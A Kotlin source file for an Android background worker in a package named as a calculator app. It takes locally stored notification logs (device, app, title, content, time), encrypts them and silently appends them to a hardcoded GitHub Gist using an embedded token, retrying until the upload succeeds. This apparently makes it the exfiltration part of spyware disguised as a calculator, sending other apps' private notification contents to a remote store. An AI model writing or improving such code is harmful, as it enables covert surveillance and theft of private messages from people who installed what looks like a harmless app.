package com.android.mycalculator

import android.content.Context
import android.util.Log
import androidx.work.Worker
import androidx.work.WorkerParameters
import org.json.JSONObject
import java.io.BufferedReader
import java.io.InputStreamReader
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL

class SyncWorker(context: Context, workerParams: WorkerParameters) : Worker(context, workerParams) {
    
    companion object {
        private const val GITHUB_TOKEN = BuildConfig.GITHUB_TOKEN
        // IMPORTANT: Put your Gist ID back in here!
        private const val GIST_ID = "b529558252be113e01993f24429e8556" 
    }

override fun doWork(): Result {
        val dbHelper = DatabaseHelper(applicationContext)
        val unsyncedLogs = dbHelper.getUnsyncedLogs()

        if (unsyncedLogs.isEmpty()) {
            return Result.success()
        }

        try {
            // 1. GET CURRENT GIST DATA
            val getUrl = URL("https://api.github.com/gists/$GIST_ID")
            val getConn = getUrl.openConnection() as HttpURLConnection
            
            // NEW: Add timeouts (e.g., 15 seconds) to prevent infinite hanging
            getConn.connectTimeout = 15000
            getConn.readTimeout = 15000
            
            getConn.requestMethod = "GET"
            getConn.setRequestProperty("Authorization", "Bearer $GITHUB_TOKEN")
            getConn.setRequestProperty("Accept", "application/vnd.github.v3+json")

            var currentContent = ""
            if (getConn.responseCode == 200) {
                // NEW: Use .use { } to automatically close the stream safely
                val responseStr = BufferedReader(InputStreamReader(getConn.inputStream)).use { it.readText() }
                
                val jsonResponse = JSONObject(responseStr)
                val files = jsonResponse.getJSONObject("files")
                if (files.has("notifications.csv")) {
                    val rawGistData = files.getJSONObject("notifications.csv").getString("content")
                    
                    if (rawGistData.startsWith("Device,App")) {
                        currentContent = rawGistData
                    } else {
                        currentContent = EncryptionHelper.decrypt(rawGistData)
                    }
                }
            }
            getConn.disconnect()

            if (currentContent.isEmpty()) {
                currentContent = "Device,App,Title,Content,Time\n"
            } else if (!currentContent.endsWith("\n")) {
                currentContent += "\n"
            }

            // 2. APPEND ALL UNSYNCED LOGS
            val syncedIds = mutableListOf<Int>()
            for (log in unsyncedLogs) {
                currentContent += log.second 
                syncedIds.add(log.first)    
            }

            // 3. ENCRYPT THE FINAL FILE
            val encryptedPayload = EncryptionHelper.encrypt(currentContent)

            // 4. UPLOAD TO GITHUB
            val patchUrl = URL("https://api.github.com/gists/$GIST_ID")
            val patchConn = patchUrl.openConnection() as HttpURLConnection
            
            // NEW: Add timeouts here as well
            patchConn.connectTimeout = 15000
            patchConn.readTimeout = 15000
            
            patchConn.requestMethod = "PATCH"
            patchConn.setRequestProperty("Authorization", "Bearer $GITHUB_TOKEN")
            patchConn.setRequestProperty("Accept", "application/vnd.github.v3+json")
            patchConn.setRequestProperty("Content-Type", "application/json")
            patchConn.doOutput = true

            val fileObj = JSONObject()
            fileObj.put("content", encryptedPayload) 
            
            val filesObj = JSONObject()
            filesObj.put("notifications.csv", fileObj)
            
            val payloadObj = JSONObject()
            payloadObj.put("files", filesObj)
            
            val jsonPayload = payloadObj.toString()

            // NEW: Use .use { } for the output stream writer
            OutputStreamWriter(patchConn.outputStream).use { writer ->
                writer.write(jsonPayload)
                writer.flush()
            }

            val responseCode = patchConn.responseCode
            patchConn.disconnect()

            if (responseCode == 200) {
                dbHelper.markAsSynced(syncedIds)
                return Result.success()
            } else {
                Log.e("SyncWorker", "GitHub API Error Code: $responseCode")
                return Result.retry() 
            }

        } catch (e: Exception) {
            e.printStackTrace()
            return Result.retry() 
        }
    }
}
